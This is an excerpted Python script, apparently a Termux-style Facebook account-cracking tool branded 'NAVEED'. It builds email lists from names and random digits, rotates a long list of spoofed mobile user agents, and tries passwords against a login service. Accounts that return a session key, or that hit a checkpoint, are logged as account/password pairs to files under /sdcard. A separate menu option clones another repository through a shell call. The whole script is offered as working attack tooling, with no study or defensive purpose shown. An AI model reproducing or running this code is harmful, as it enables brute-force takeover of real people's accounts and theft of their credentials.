...
logo= f'''
 _   _                          _ 
{R}   | \ | |                        | |
{G}   |  \| | __ ___   _____  ___  __| |
{R}   | . ` |/ _` \ \ / / _ \/ _ \/ _` |
{P}   | |\  | (_| |\ V /  __/  __/ (_| |
{R}   \_| \_/\__,_| \_/ \___|\___|\__,_|
\033[1;93m=================================
\033[1;97m Owner  : Naveed :/
\033[1;97m GitHub : NaveedAlone :/
...
def NAV_Main():
    ...
    if inpp == "4":
     ...
     os.system('cd && git clone --depth=1 https://github.com/NAVEED-404/FILE')
...
def gmail():     
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.NAVEED','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.NAVEED','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.NAVEED', 'r').read().splitlines()
...
Mozilla/5.0 (Linux; Android 7; Mi 9T Pro Build/AOD4WWQKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4488.118 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7; Infinix-X552 Build/LFRSW6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4525.67 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]
Mozilla/5.0 (Linux; Android 9; Infinix-X552 Build/GVVK8L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4722.50 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]
Mozilla/5.0 (Linux; Android 8; Mi 9T Pro Build/N91DC0QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4691.57 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 12; Mi 9T Pro Build/N948DKQKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.4323.55 Mobile Safari/537.36
...
Mozilla/5.0 (Linux; Android 9; Infinix-X552 Build/K321E4) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4540.98 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]
Mozilla/5.0 (Linux; Android 4.4.2; MITO A75) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36
...
Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 272.0.0.14.74 (iPhone15,3; iOS 16_3_1; it_IT; it-IT; scale=3.00; 1290x2796; 450101762) NW/3
Mozilla/5.0 (Linux; arm_64; Android 8.0.0; RNE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaApp_Android/23.14.1 YaSearchBrowser/23.14.1 BroPP/1.0 SA/3 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 12; SM-G990B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 7.0; SM-G928F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.64 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/341.0.0.7.68;]
Mozilla/5.0 (Linux; Android 12; CPH2005 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15 [ip:151.33.68.183]
...
def method():
    ...
    print(f"{oo('•')}/sdcard/NAVEED-OK.txt")
    print('\033[1;93m='*25)
    print()
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mNAVEED-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/NAVEED-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
